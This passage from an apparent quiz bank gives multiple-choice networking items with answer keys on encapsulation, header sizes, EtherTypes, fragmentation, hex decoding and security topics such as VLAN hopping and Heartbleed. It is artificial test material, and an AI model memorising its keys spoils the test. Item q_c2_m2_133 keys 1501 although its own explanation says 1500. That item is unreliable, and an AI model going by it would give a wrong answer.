  },
  {
    "id": "q_c2_m2_109",
    "topic": "Encapsulation & PDUs",
    "difficulty": "medium",
    "q": "Which field in the TCP header acts as the demultiplexing key identifying which listening application socket receives the data?",
    "options": [
      "Sequence Number",
      "Destination Port",
      "Window Size",
      "Checksum"
    ],
    "correct": 1,
    "explanation": "The 16-bit Destination Port field directs the segment's data payload to the specific software process bound to that port."
  },
  {
    "id": "q_c2_m2_110",
    "topic": "Encapsulation & PDUs",
    "difficulty": "medium",
    "q": "What is the hexadecimal EtherType value indicating an encapsulated IPv4 packet?",
    "options": [
      "0x0806",
      "0x0800",
      "0x86DD",
      "0x8100"
    ],
    "correct": 1,
    "explanation": "0x0800 denotes an IPv4 packet inside an Ethernet II frame."
  },
  {
    "id": "q_c2_m2_111",
    "topic": "Encapsulation & PDUs",
    "difficulty": "medium",
    "q": "What is the hexadecimal EtherType value indicating an encapsulated IPv6 packet?",
    "options": [
      "0x0800",
      "0x0806",
      "0x86DD",
      "0x8847"
    ],
    "correct": 2,
    "explanation": "0x86DD denotes an IPv6 packet inside an Ethernet II frame."
  },
  {
    "id": "q_c2_m2_112",
    "topic": "Encapsulation & PDUs",
    "difficulty": "medium",
    "q": "What is the hexadecimal EtherType value indicating an encapsulated Address Resolution Protocol (ARP) frame?",
    "options": [
      "0x0800",
      "0x0806",
      "0x86DD",
      "0x0023"
    ],
    "correct": 1,
    "explanation": "0x0806 denotes an ARP frame inside an Ethernet II frame."
  },
  {
    "id": "q_c2_m2_113",
    "topic": "Encapsulation & PDUs",
    "difficulty": "medium",
    "q": "What standard IP Protocol number in the IPv4 header designates TCP (Transmission Control Protocol)?",
    "options": [
      "Protocol 1",
      "Protocol 6",
      "Protocol 17",
      "Protocol 47"
    ],
    "correct": 1,
    "explanation": "Protocol 6 designates TCP in the IP header."
  },
  {
    "id": "q_c2_m2_114",
    "topic": "Encapsulation & PDUs",
    "difficulty": "medium",
    "q": "What standard IP Protocol number in the IPv4 header designates UDP (User Datagram Protocol)?",
    "options": [
      "Protocol 1",
      "Protocol 6",
      "Protocol 17",
      "Protocol 50"
    ],
    "correct": 2,
    "explanation": "Protocol 17 designates UDP in the IP header."
  },
  {
    "id": "q_c2_m2_115",
    "topic": "Encapsulation & PDUs",
    "difficulty": "medium",
    "q": "What standard IP Protocol number in the IPv4 header designates ICMP (Internet Control Message Protocol)?",
    "options": [
      "Protocol 1",
      "Protocol 6",
      "Protocol 17",
      "Protocol 89"
    ],
    "correct": 0,
    "explanation": "Protocol 1 designates ICMP in the IPv4 header."
  },
  {
    "id": "q_c2_m2_116",
    "topic": "Encapsulation & PDUs",
    "difficulty": "medium",
    "q": "What is the total size of a standard Ethernet II header (excluding preamble and FCS)?",
    "options": [
      "20 bytes",
      "14 bytes",
      "32 bytes",
      "12 bytes"
    ],
    "correct": 1,
    "explanation": "An Ethernet II header consists of 6 bytes Destination MAC + 6 bytes Source MAC + 2 bytes EtherType = exactly 14 bytes."
  },
  {
    "id": "q_c2_m2_117",
    "topic": "Encapsulation & PDUs",
    "difficulty": "medium",
    "q": "What is the minimum header size of an IPv4 packet without optional fields?",
    "options": [
      "14 bytes",
      "20 bytes",
      "32 bytes",
      "40 bytes"
    ],
    "correct": 1,
    "explanation": "The base IPv4 header with IHL=5 (5 × 32-bit words) is exactly 20 bytes."
  },
  {
    "id": "q_c2_m2_118",
    "topic": "Encapsulation & PDUs",
    "difficulty": "medium",
    "q": "What is the minimum header size of a TCP segment without optional fields?",
    "options": [
      "8 bytes",
      "20 bytes",
      "32 bytes",
      "14 bytes"
    ],
    "correct": 1,
    "explanation": "The base TCP header with Data Offset=5 (5 × 32-bit words) is exactly 20 bytes."
  },
  {
    "id": "q_c2_m2_119",
    "topic": "Encapsulation & PDUs",
    "difficulty": "medium",
    "q": "What is the standard Maximum Transmission Unit (MTU) for standard Ethernet local area networks?",
    "options": [
      "576 bytes",
      "1,500 bytes",
      "9,000 bytes",
      "65,535 bytes"
    ],
    "correct": 1,
    "explanation": "Standard Ethernet specifies an MTU of 1,500 bytes (the maximum size of the IP packet encapsulated within the frame)."
  },
  {
    "id": "q_c2_m2_120",
    "topic": "Encapsulation & PDUs",
    "difficulty": "medium",
    "q": "How is the standard TCP Maximum Segment Size (MSS) calculated on standard Ethernet (MTU = 1500)?",
    "options": [
      "1500 + 40 = 1540 bytes",
      "1500 - 20 (IP) - 20 (TCP) = 1460 bytes",
      "1500 / 2 = 750 bytes",
      "1500 - 14 (Ethernet) = 1486 bytes"
    ],
    "correct": 1,
    "explanation": "MSS = MTU (1500) - IPv4 Header (20) - TCP Header (20) = exactly 1,460 bytes."
  },
  {
    "id": "q_c2_m2_121",
    "topic": "Encapsulation & PDUs",
    "difficulty": "medium",
    "q": "As an IP packet crosses an intermediate router, what happens to the Layer 2 Ethernet header?",
    "options": [
      "It is preserved completely unchanged all the way to the final destination.",
      "It is stripped by the router and replaced with a new Ethernet header containing the router's egress MAC as source and the next hop's MAC as destination.",
      "It is encrypted using AES-256.",
      "It is moved into the TCP options field."
    ],
    "correct": 1,
    "explanation": "Layer 2 frames exist only on a single physical link. Routers strip the incoming Layer 2 header and encapsulate the packet in a new Layer 2 header for the next link."
  },
  {
    "id": "q_c2_m2_122",
    "topic": "Encapsulation & PDUs",
    "difficulty": "medium",
    "q": "As an IP packet crosses an intermediate router, what happens to its Time-to-Live (TTL) field in the IPv4 header?",
    "options": [
      "It is increased by 1.",
      "It is decremented by 1; if it reaches 0, the packet is discarded.",
      "It is reset to 255.",
      "It remains unchanged unless an error occurs."
    ],
    "correct": 1,
    "explanation": "Every router that forwards an IP packet decrements the TTL field by at least 1, discarding the packet if TTL reaches 0 to prevent infinite routing loops."
  },
  {
    "id": "q_c2_m2_123",
    "topic": "Encapsulation & PDUs",
    "difficulty": "medium",
    "q": "When an intermediate router decrements the TTL field of an IPv4 packet, what other field in the IPv4 header MUST be recalculated?",
    "options": [
      "Source IP address",
      "Header Checksum",
      "Identification number",
      "Total Length"
    ],
    "correct": 1,
    "explanation": "Because the TTL field is part of the IPv4 header, altering its value invalidates the original IP Header Checksum, requiring the router to recompute it."
  },
  {
    "id": "q_c2_m2_124",
    "topic": "Encapsulation & PDUs",
    "difficulty": "medium",
    "q": "In a standard routed network without NAT, do the Source IP address and Destination IP address change as a packet hops from router to router?",
    "options": [
      "Yes, both IP addresses change at every single hop.",
      "No, the original Source and Destination IP addresses remain constant end-to-end.",
      "Only the Destination IP changes; the Source IP stays the same.",
      "Only the Source IP changes; the Destination IP stays the same."
    ],
    "correct": 1,
    "explanation": "Without NAT, Layer 3 IP addresses remain constant end-to-end between the original sender and the ultimate destination."
  },
  {
    "id": "q_c2_m2_125",
    "topic": "Encapsulation & PDUs",
    "difficulty": "medium",
    "q": "What is appended to the tail of an Ethernet frame on the physical wire to allow the receiving NIC to detect transmission bit errors?",
    "options": [
      "Preamble",
      "Frame Check Sequence (FCS) containing a CRC-32 checksum",
      "TCP Checksum",
      "IP Total Length indicator"
    ],
    "correct": 1,
    "explanation": "The 4-byte Frame Check Sequence (FCS) trailer contains a 32-bit Cyclic Redundancy Check (CRC-32) calculated across the frame."
  },
  {
    "id": "q_c2_m2_126",
    "topic": "Encapsulation & PDUs",
    "difficulty": "difficult",
    "q": "An Ethernet frame has an overall length of 146 bytes on the wire (excluding FCS). The IPv4 header length is 20 bytes and the TCP header length is 32 bytes. What is the exact size of the application payload?",
    "options": [
      "94 bytes",
      "80 bytes",
      "102 bytes",
      "64 bytes"
    ],
    "correct": 1,
    "explanation": "Frame (146) = Ethernet (14) + IP (20) + TCP (32) + Payload. Payload = 146 - 14 - 20 - 32 = 80 bytes."
  },
  {
    "id": "q_c2_m2_127",
    "topic": "Encapsulation & PDUs",
    "difficulty": "difficult",
    "q": "An IPv4 packet header has a 'Total Length' field containing the hexadecimal value 0x0098. If the IPv4 header length is 20 bytes and the TCP header length is 20 bytes, how many bytes of application payload are encapsulated?",
    "options": [
      "152 bytes",
      "112 bytes",
      "98 bytes",
      "132 bytes"
    ],
    "correct": 1,
    "explanation": "0x0098 in decimal is 152 bytes. IP Total Length includes the IP header + payload. Payload = 152 - 20 (IP) - 20 (TCP) = 112 bytes."
  },
  {
    "id": "q_c2_m2_128",
    "topic": "Encapsulation & PDUs",
    "difficulty": "difficult",
    "q": "A packet capture reveals an IPv4 header where byte 0 is 0x45 and the Total Length field (bytes 2-3) is 0x0034. What protocol payload size is carried directly inside the IP packet?",
    "options": [
      "52 bytes",
      "32 bytes",
      "45 bytes",
      "20 bytes"
    ],
    "correct": 1,
    "explanation": "0x0034 in decimal is 52 bytes. Since IHL=5 (20 bytes), the encapsulated Layer 4 protocol (e.g. TCP/UDP) is 52 - 20 = 32 bytes."
  },
  {
    "id": "q_c2_m2_129",
    "topic": "Encapsulation & PDUs",
    "difficulty": "difficult",
    "q": "Why is the 4-byte Frame Check Sequence (FCS) trailer typically missing when viewing packets in Wireshark or tcpdump on a standard Linux workstation?",
    "options": [
      "Wireshark deletes the FCS because of privacy regulations.",
      "The receiving Network Interface Card (NIC) hardware validates and strips the FCS before passing the frame to the operating system kernel and libpcap driver.",
      "FCS only exists on token ring networks, not Ethernet.",
      "The FCS is encrypted by the router."
    ],
    "correct": 1,
    "explanation": "Network adapters verify the CRC-32 checksum in hardware; if valid, the NIC strips the FCS trailer before transferring the frame into kernel memory, so packet capture libraries never see it."
  },
  {
    "id": "q_c2_m2_130",
    "topic": "Encapsulation & PDUs",
    "difficulty": "difficult",
    "q": "An enterprise deploys a GRE (Generic Routing Encapsulation) over IPsec tunnel across the public internet. What happens to the available MTU for internal user packets?",
    "options": [
      "The MTU increases to 9000 bytes automatically.",
      "The effective MTU is reduced because GRE (24 bytes) and IPsec ESP (typically 50-70 bytes) headers consume space inside the 1500-byte physical Ethernet frame, leaving less room for the inner IP packet.",
      "The MTU remains exactly 1500 bytes with zero overhead.",
      "The MTU becomes dynamic and changes every millisecond."
    ],
    "correct": 1,
    "explanation": "Encapsulating packets inside GRE and IPsec adds outer IP, GRE, ESP, and trailer overhead, reducing the maximum inner packet size (typically down to 1400-1420 bytes)."
  },
  {
    "id": "q_c2_m2_131",
    "topic": "Encapsulation & PDUs",
    "difficulty": "difficult",
    "q": "What is the operational cause of a 'Path MTU Discovery (PMTUD) Black Hole'?",
    "options": [
      "An attacker poisons the local ARP table.",
      "A router on the path drops packets that exceed its MTU with DF=1, but the ICMP Type 3 Code 4 ('Fragmentation Needed') error message is blocked by an upstream firewall, preventing the sender from discovering that it must reduce its packet size.",
      "The DNS server fails to resolve the domain name.",
      "The switch CAM table overflows with random MACs."
    ],
    "correct": 1,
    "explanation": "When intermediate firewalls block all ICMP traffic, the sender never receives the ICMP 'Fragmentation Needed' notice when packets exceed tunnel MTU, causing large TCP transfers to freeze indefinitely."
  },
  {
    "id": "q_c2_m2_132",
    "topic": "Encapsulation & PDUs",
    "difficulty": "difficult",
    "q": "How does enabling 'TCP MSS Clamping' on a perimeter VPN gateway mitigate PMTUD black hole issues for internal clients?",
    "options": [
      "It encrypts all DNS lookups over HTTPS.",
      "The gateway intercepts TCP SYN packets traversing the tunnel and rewrites the advertised MSS option to match the reduced tunnel MTU, forcing endpoints to send smaller segments without relying on ICMP.",
      "It increases the physical MTU of the public internet to 2000 bytes.",
      "It disables all TCP sequence number checking."
    ],
    "correct": 1,
    "explanation": "MSS clamping inspects the TCP handshake and rewrites the Maximum Segment Size option to a safe value (e.g. 1360 bytes), ensuring neither endpoint sends segments that would exceed the tunnel MTU."
  },
  {
    "id": "q_c2_m2_133",
    "topic": "Encapsulation & PDUs",
    "difficulty": "difficult",
    "q": "During a forensic packet inspection, an investigator observes that a host transmitted a TCP segment with Sequence Number 1000 and 500 bytes of payload. What Acknowledgement Number should the receiver return in its next segment?",
    "options": [
      "1000",
      "1500",
      "1501",
      "500"
    ],
    "correct": 2,
    "explanation": "TCP cumulative acknowledgements indicate the next expected byte. If the receiver receives bytes 1000 through 1499 (500 bytes), its ACK will be 1000 + 500 = 1500 (or 1501 if 1-indexed relative sequence numbering is used; strictly next expected byte is 1500)."
  },
  {
    "id": "q_c2_m2_134",
    "topic": "Encapsulation & PDUs",
    "difficulty": "difficult",
    "q": "In an IEEE 802.1Q tagged Ethernet frame, where is the 4-byte VLAN tag inserted during encapsulation?",
    "options": [
      "At the very end of the frame after the FCS trailer",
      "Directly between the Source MAC address and the EtherType field (with a TPID of 0x8100)",
      "Inside the IPv4 Options field",
      "Directly before the Destination MAC address"
    ],
    "correct": 1,
    "explanation": "802.1Q inserts a 4-byte tag directly after the Source MAC; the original EtherType is replaced with 0x8100 (TPID), followed by Priority/VLAN ID, followed by the original EtherType."
  },
  {
    "id": "q_c2_m2_135",
    "topic": "Encapsulation & PDUs",
    "difficulty": "difficult",
    "q": "An attacker attempts an 802.1Q 'Double Tagging' VLAN hopping attack. What structural encapsulation anomaly is exploited?",
    "options": [
      "The attacker sends an Ethernet frame containing two 802.1Q tags; the native VLAN trunk switch strips the outer tag, allowing the inner tag to be forwarded to a target VLAN on a subsequent trunk switch.",
      "The attacker replaces the IP header with a MAC header.",
      "The attacker sets the TTL to 0 to bypass routing.",
      "The attacker forces the switch into half-duplex mode."
    ],
    "correct": 0,
    "explanation": "Double tagging embeds an outer tag matching the native trunk VLAN and an inner tag matching the victim VLAN; the first switch strips the outer tag, and the second switch forwards it to the target VLAN."
  },
  {
    "id": "q_c2_m2_136",
    "topic": "Encapsulation & PDUs",
    "difficulty": "difficult",
    "q": "How does decapsulation handle an unknown EtherType value (e.g. 0x9999) on a receiving Linux workstation?",
    "options": [
      "The workstation crashes with a kernel panic.",
      "The operating system's link layer cannot match the EtherType to any registered network layer protocol handler, so it silently drops the frame and increments the interface 'unknown protocol' drop counter.",
      "The workstation forwards the frame to the default gateway.",
      "The workstation broadcasts an ARP request."
    ],
    "correct": 1,
    "explanation": "If the EtherType does not match any registered protocol stack handler (e.g. IPv4, IPv6, ARP), the kernel drops the frame and records an unknown protocol error."
  },
  {
    "id": "q_c2_m2_137",
    "topic": "Encapsulation & PDUs",
    "difficulty": "difficult",
    "q": "An investigator inspects a raw frame captured on an internal database server: `Source MAC: 00:50:56:FE:ED:01`, `Source IP: 198.51.100.44`. The IP is a public internet address. What does the Source MAC represent?",
    "options": [
      "The physical MAC address of the external attacker's laptop",
      "The MAC address of the database server's internal router / firewall default gateway interface",
      "The MAC address of the ISP's core backbone router",
      "The MAC address of the root DNS server"
    ],
    "correct": 1,
    "explanation": "Because Layer 2 frames do not cross routers, the Source MAC on an incoming routed packet always belongs to the last-hop router or firewall interface that transmitted the frame onto the local segment."
  },
  {
    "id": "q_c2_m2_138",
    "topic": "Encapsulation & PDUs",
    "difficulty": "difficult",
    "q": "When an IPv4 packet undergoes fragmentation by an intermediate router, which header fields are modified or copied across all fragments?",
    "options": [
      "Source IP, Destination IP, and Identification are copied to all fragments; Fragment Offset and More Fragments (MF) flag are set appropriately; Total Length reflects the fragment size.",
      "Only the first fragment retains the IP header; subsequent fragments have no IP header.",
      "The TCP header is duplicated across all fragments.",
      "The TTL is reset to 255 on all fragments."
    ],
    "correct": 0,
    "explanation": "Each fragment must be an independent IP packet with its own IP header sharing the same Identification, Source IP, Destination IP, and Protocol, with updated Total Length, Flags (MF), and Fragment Offset."
  },
  {
    "id": "q_c2_m2_139",
    "topic": "Encapsulation & PDUs",
    "difficulty": "difficult",
    "q": "In a fragmented IPv4 transmission, where does the Layer 4 TCP or UDP header reside?",
    "options": [
      "In every single fragment for identification",
      "Exclusively in the first fragment (Fragment Offset = 0)",
      "In the final fragment (MF = 0)",
      "In an external ICMP message"
    ],
    "correct": 1,
    "explanation": "The Layer 4 header (containing ports and flags) resides solely at offset 0 inside the very first fragment; subsequent fragments contain only raw continuation payload bytes."
  },
  {
    "id": "q_c2_m2_140",
    "topic": "Encapsulation & PDUs",
    "difficulty": "difficult",
    "q": "Why do stateless packet filter firewalls struggle to enforce port-based security policies against fragmented traffic?",
    "options": [
      "Stateless firewalls cannot read IP addresses.",
      "Subsequent fragments (offset > 0) lack Layer 4 port headers; if the firewall cannot reassemble or track fragments, it must either blindly permit them or drop all fragmented packets.",
      "Stateless firewalls only operate at Layer 1.",
      "Fragmented packets bypass the physical network interface."
    ],
    "correct": 1,
    "explanation": "Because non-initial fragments lack TCP/UDP port headers, a stateless firewall cannot determine which port the fragment belongs to, creating a vulnerability where attackers bypass filters."
  },
  {
    "id": "q_c2_m2_141",
    "topic": "Encapsulation & PDUs",
    "difficulty": "difficult",
    "q": "An analyst decodes an IPv4 header with an Internet Header Length (IHL) of 6. What is the size of the IPv4 header and what does this indicate?",
    "options": [
      "24 bytes ($6 \\times 4$); indicates 20 bytes of base header plus 4 bytes of IPv4 Options.",
      "6 bytes total; an illegal packet.",
      "60 bytes; indicates maximum fragmentation.",
      "24 bits; indicates an IPv6 compressed header."
    ],
    "correct": 0,
    "explanation": "IHL is measured in 32-bit (4-byte) words. $6 \\times 4 = 24 \\text{ bytes}$, meaning the header contains the standard 20-byte base plus 4 bytes of IPv4 Options."
  },
  {
    "id": "q_c2_m2_142",
    "topic": "Encapsulation & PDUs",
    "difficulty": "difficult",
    "q": "What is the maximum possible size of an IPv4 header, and what determines this boundary?",
    "options": [
      "20 bytes; no options allowed",
      "60 bytes; determined by the 4-bit IHL field whose maximum value is 15 ($15 \\times 4 = 60$ bytes)",
      "65,535 bytes; determined by Total Length",
      "1500 bytes; determined by Ethernet MTU"
    ],
    "correct": 1,
    "explanation": "The IHL field is 4 bits wide (max binary 1111 = 15). $15 \\times 4 = 60$ bytes maximum header length (20 bytes base + up to 40 bytes options)."
  },
  {
    "id": "q_c2_m2_143",
    "topic": "Encapsulation & PDUs",
    "difficulty": "difficult",
    "q": "An analyst decodes a TCP header where the Data Offset field is hexadecimal 0xA. What is the size of the TCP header in bytes?",
    "options": [
      "10 bytes",
      "40 bytes",
      "20 bytes",
      "32 bytes"
    ],
    "correct": 1,
    "explanation": "0xA is decimal 10. Data Offset is measured in 32-bit (4-byte) words. $10 \\times 4 = 40$ bytes (20 bytes base header + 20 bytes of TCP Options)."
  },
  {
    "id": "q_c2_m2_144",
    "topic": "Encapsulation & PDUs",
    "difficulty": "difficult",
    "q": "Why is the minimum payload size for an Ethernet frame set to 46 bytes (resulting in a minimum frame size of 64 bytes on wire including 14B header and 4B FCS)?",
    "options": [
      "To prevent hard drives from getting fragmented",
      "To ensure that on shared CSMA/CD half-duplex copper networks, a collision is guaranteed to be detected by the transmitting station before it finishes transmitting the frame",
      "To ensure backward compatibility with token ring",
      "To accommodate the size of an RSA public key"
    ],
    "correct": 1,
    "explanation": "In IEEE 802.3 CSMA/CD, the minimum frame size (64 bytes) ensures the transmission duration exceeds the maximum network round-trip propagation time, guaranteeing collision detection."
  },
  {
    "id": "q_c2_m2_145",
    "topic": "Encapsulation & PDUs",
    "difficulty": "difficult",
    "q": "If an IP packet is only 28 bytes total (20B IP + 8B UDP), how does the Ethernet link layer handle encapsulation to satisfy the 64-byte minimum frame size?",
    "options": [
      "It rejects the packet and drops it.",
      "It appends 18 bytes of padding (zeros) after the IP packet before calculating the FCS trailer.",
      "It duplicates the UDP header 4 times.",
      "It converts the packet into an ICMP error."
    ],
    "correct": 1,
    "explanation": "To satisfy the 46-byte minimum payload requirement ($14 \\text{ header} + 46 \\text{ payload} + 4 \\text{ FCS} = 64 \\text{ bytes}$), Ethernet appends padding octets (zeros) to short payloads."
  },
  {
    "id": "q_c2_m2_146",
    "topic": "Encapsulation & PDUs",
    "difficulty": "difficult",
    "q": "What is the security hazard of uninitialized memory padding in legacy Ethernet drivers (Etherleak - CVE-2003-0001)?",
    "options": [
      "The padding caused switches to reboot.",
      "Network drivers padded short frames with uninitialized kernel buffer memory, leaking kernel data and cryptographic keys onto the local network segment in cleartext.",
      "The padding allowed unauthorized remote root access via Telnet.",
      "The padding inverted the CRC checksum."
    ],
    "correct": 1,
    "explanation": "Etherleak occurred when network drivers failed to zero-out padding buffers, leaking sensitive adjacent kernel memory onto the wire inside the padding of short frames."
  },
  {
    "id": "q_c2_m2_147",
    "topic": "Encapsulation & PDUs",
    "difficulty": "difficult",
    "q": "In an IPv6 header, why is there no 'Header Checksum' field, unlike in IPv4?",
    "options": [
      "IPv6 packets are immune to transmission errors.",
      "To accelerate router forwarding performance; Layer 2 (Ethernet CRC) and Layer 4 (TCP/UDP checksums) already validate data integrity, making an intermediate Layer 3 checksum redundant.",
      "IPv6 relies entirely on IPsec for all packets.",
      "IPv6 headers are encrypted."
    ],
    "correct": 1,
    "explanation": "Eliminating the header checksum in IPv6 allows intermediate routers to decrement the Hop Limit without recalculating a checksum at every hop, significantly improving forwarding throughput."
  },
  {
    "id": "q_c2_m2_148",
    "topic": "Encapsulation & PDUs",
    "difficulty": "difficult",
    "q": "How does IPv6 handle the demultiplexing of optional headers and transport protocols compared to IPv4's Protocol field?",
    "options": [
      "IPv6 uses the 'Next Header' field in a daisy-chained linked list format (e.g. Hop-by-Hop -> Routing -> Fragment -> TCP).",
      "IPv6 uses a fixed 128-bit protocol table.",
      "IPv6 requires all options to be sent in separate ICMP packets.",
      "IPv6 only supports TCP."
    ],
    "correct": 0,
    "explanation": "IPv6 uses a flexible 'Next Header' pointer chain where extension headers are cascaded in sequence until the final Next Header points to the transport protocol (e.g. 6 for TCP)."
  },
  {
    "id": "q_c2_m2_149",
    "topic": "Encapsulation & PDUs",
    "difficulty": "difficult",
    "q": "What is the operational consequence if an endpoint's network card enables 'TCP Segmentation Offload' (TSO) during a Wireshark packet capture on that host?",
    "options": [
      "Wireshark captures show massive outbound TCP packets (e.g. 64 KB) that exceed the 1500-byte MTU, because the capture occurs before the NIC hardware segments the stream into legal MTU frames.",
      "The NIC drops all packets larger than 512 bytes.",
      "All TCP sequence numbers become zero.",
      "The operating system crashes."
    ],
    "correct": 0,
    "explanation": "With TSO, the OS kernel offloads segmentation to the NIC. Packet capture software hooked into the OS driver sees the pre-segmented 64 KB super-packet, creating the false illusion of giant packets on the wire."
  },
  {
    "id": "q_c2_m2_150",
    "topic": "Encapsulation & PDUs",
    "difficulty": "difficult",
    "q": "An incident responder captures a frame with EtherType 0x8847. What protocol technology is operating at this boundary?",
    "options": [
      "MPLS (Multi-Protocol Label Switching) Unicast",
      "PPPoE Session",
      "IEEE 802.1X Authentication",
      "Fibre Channel over Ethernet"
    ],
    "correct": 0,
    "explanation": "EtherType 0x8847 indicates MPLS Unicast traffic, where label switching tags encapsulate the underlying IP packet."
  },
  {
    "id": "q_c2_m2_151",
    "topic": "Forensics & Security by Layer",
    "difficulty": "medium",
    "q": "When analyzing a hexadecimal packet dump, what does each pair of hexadecimal characters (e.g. '4a') represent?",
    "options": [
      "One bit of data",
      "One byte (8 bits) of data",
      "One word (32 bits) of data",
      "One decimal digit"
    ],
    "correct": 1,
    "explanation": "In hexadecimal representation, two hex digits represent one 8-bit byte (octet), with values ranging from 0x00 (0) to 0xFF (255)."
  },
  {
    "id": "q_c2_m2_152",
    "topic": "Forensics & Security by Layer",
    "difficulty": "medium",
    "q": "In an IPv4 packet header, the byte at offset 0x08 has the hexadecimal value 0x40. What does this represent in decimal?",
    "options": [
      "40",
      "64",
      "128",
      "32"
    ],
    "correct": 1,
    "explanation": "0x40 in hexadecimal equals $4 \\times 16 + 0 = 64$ in decimal."
  },
  {
    "id": "q_c2_m2_153",
    "topic": "Forensics & Security by Layer",
    "difficulty": "medium",
    "q": "An investigator inspects a raw frame and sees that the IPv4 Protocol field is 0x06. What Layer 4 protocol is inside?",
    "options": [
      "ICMP",
      "TCP",
      "UDP",
      "IGMP"
    ],
    "correct": 1,
    "explanation": "Protocol 0x06 represents TCP."
  },
  {
    "id": "q_c2_m2_154",
    "topic": "Forensics & Security by Layer",
    "difficulty": "medium",
    "q": "An investigator inspects a raw frame and sees that the IPv4 Protocol field is 0x11. What Layer 4 protocol is inside?",
    "options": [
      "TCP",
      "UDP",
      "ICMP",
      "GRE"
    ],
    "correct": 1,
    "explanation": "Hexadecimal 0x11 equals decimal 17, which denotes UDP (User Datagram Protocol)."
  },
  {
    "id": "q_c2_m2_155",
    "topic": "Forensics & Security by Layer",
    "difficulty": "medium",
    "q": "An investigator inspects a raw frame and sees that the IPv4 Protocol field is 0x01. What Layer 4 protocol is inside?",
    "options": [
      "TCP",
      "UDP",
      "ICMP",
      "OSPF"
    ],
    "correct": 2,
    "explanation": "Protocol 0x01 represents ICMP (Internet Control Message Protocol)."
  },
  {
    "id": "q_c2_m2_156",
    "topic": "Forensics & Security by Layer",
    "difficulty": "medium",
    "q": "In a raw hex dump of an IPv4 packet, the Destination IP address bytes are 'ac 1e 00 0a'. What is this address in standard dotted-decimal notation?",
    "options": [
      "192.168.1.10",
      "172.30.0.10",
      "10.30.0.10",
      "172.16.0.10"
    ],
    "correct": 1,
    "explanation": "0xac = 172, 0x1e = 30, 0x00 = 0, 0x0a = 10 ➔ 172.30.0.10."
  },
  {
    "id": "q_c2_m2_157",
    "topic": "Forensics & Security by Layer",
    "difficulty": "medium",
    "q": "In a raw hex dump of an IPv4 packet, the Source IP address bytes are 'ac 1e 00 14'. What is this address in standard dotted-decimal notation?",
    "options": [
      "172.30.0.20",
      "172.16.0.20",
      "192.168.0.20",
      "10.0.0.20"
    ],
    "correct": 0,
    "explanation": "0xac = 172, 0x1e = 30, 0x00 = 0, 0x14 = 20 ➔ 172.30.0.20."
  },
  {
    "id": "q_c2_m2_158",
    "topic": "Forensics & Security by Layer",
    "difficulty": "medium",
    "q": "In a raw TCP header hex dump, the Destination Port bytes are '1f 90'. What is the destination port number in decimal?",
    "options": [
      "80",
      "443",
      "8080",
      "22"
    ],
    "correct": 2,
    "explanation": "0x1f90 in decimal is $1 \\times 4096 + 15 \\times 256 + 9 \\times 16 + 0 = 4096 + 3840 + 144 = 8080$."
  },
  {
    "id": "q_c2_m2_159",
    "topic": "Forensics & Security by Layer",
    "difficulty": "medium",
    "q": "In a raw TCP header hex dump, the Source Port bytes are '00 50'. What well-known service is the source?",
    "options": [
      "SSH (Port 22)",
      "HTTP (Port 80)",
      "HTTPS (Port 443)",
      "DNS (Port 53)"
    ],
    "correct": 1,
    "explanation": "0x0050 in decimal is $5 \\times 16 = 80$ (standard HTTP)."
  },
  {
    "id": "q_c2_m2_160",
    "topic": "Forensics & Security by Layer",
    "difficulty": "medium",
    "q": "In a raw TCP header hex dump, the flags byte is 0x18. Which TCP control flags are asserted?",
    "options": [
      "SYN and ACK",
      "PSH and ACK",
      "FIN and ACK",
      "URG and PSH"
    ],
    "correct": 1,
    "explanation": "0x18 in binary is 00011000. Bit 3 is PSH (0x08) and Bit 4 is ACK (0x10). PSH + ACK = 0x18."
  },
  {
    "id": "q_c2_m2_161",
    "topic": "Forensics & Security by Layer",
    "difficulty": "medium",
    "q": "In a raw TCP header hex dump, the flags byte is 0x02. What connection lifecycle phase does this indicate?",
    "options": [
      "Initial SYN connection request",
      "Connection termination (FIN)",
      "Immediate reset (RST)",
      "Keep-alive ping"
    ],
    "correct": 0,
    "explanation": "0x02 in binary is 00000010 (SYN flag asserted), indicating an initial connection request."
  },
  {
    "id": "q_c2_m2_162",
    "topic": "Forensics & Security by Layer",
    "difficulty": "medium",
    "q": "In a raw TCP header hex dump, the flags byte is 0x12. What connection handshake packet is this?",
    "options": [
      "Client SYN",
      "Server SYN-ACK reply",
      "Client final ACK",
      "Server FIN-ACK"
    ],
    "correct": 1,
    "explanation": "0x12 is 0x10 (ACK) + 0x02 (SYN) = SYN-ACK, the second step of the TCP 3-way handshake."
  },
  {
    "id": "q_c2_m2_163",
    "topic": "Forensics & Security by Layer",
    "difficulty": "medium",
    "q": "What is the hexadecimal representation of the line terminator CRLF (\r\n) required by HTTP/1.1 specifications?",
    "options": [
      "0x0a 0x0d",
      "0x0d 0x0a",
      "0x20 0x20",
      "0x00 0x00"
    ],
    "correct": 1,
    "explanation": "Carriage Return (CR) is 0x0d and Line Feed (LF) is 0x0a. CRLF = 0x0d 0x0a."
  },
  {
    "id": "q_c2_m2_164",
    "topic": "Forensics & Security by Layer",
    "difficulty": "medium",
    "q": "An analyst observes an initial TTL value of 64 in an incoming packet. What family of operating systems typically generates this default TTL?",
    "options": [
      "Windows Server",
      "Linux / Unix / macOS / Android",
      "Cisco IOS",
      "Solaris"
    ],
    "correct": 1,
    "explanation": "Linux, Android, and macOS default to an initial TTL of 64, whereas Windows defaults to 128, and Cisco routers default to 255."
  },
  {
    "id": "q_c2_m2_165",
    "topic": "Forensics & Security by Layer",
    "difficulty": "medium",
    "q": "An analyst observes an initial TTL value of 128 in an incoming packet. What family of operating systems typically generates this default TTL?",
    "options": [
      "Linux kernel",
      "Microsoft Windows",
      "FreeBSD",
      "Cisco ASA"
    ],
    "correct": 1,
    "explanation": "Microsoft Windows operating systems default to an initial TTL of 128."
  },
  {
    "id": "q_c2_m2_166",
    "topic": "Forensics & Security by Layer",
    "difficulty": "medium",
    "q": "In the Heartbleed vulnerability (CVE-2014-0160), what cryptographic software library contained the flawed implementation?",
    "options": [
      "Microsoft SChannel",
      "OpenSSL",
      "GnuTLS",
      "Bouncy Castle"
    ],
    "correct": 1,
    "explanation": "Heartbleed was a critical vulnerability in OpenSSL versions 1.0.1 through 1.0.1f."
  },
  {
    "id": "q_c2_m2_167",
    "topic": "Forensics & Security by Layer",
    "difficulty": "medium",
    "q": "What was the maximum amount of private server memory an attacker could exfiltrate per heartbeat request in Heartbleed?",
    "options": [
      "64 bytes",
      "64 kilobytes (65,535 bytes)",
      "1 megabyte",
      "Entire hard drive"
    ],
    "correct": 1,
    "explanation": "The missing bounds check allowed attackers to request up to 64 KB of memory beyond the payload per heartbeat query."
  },
  {
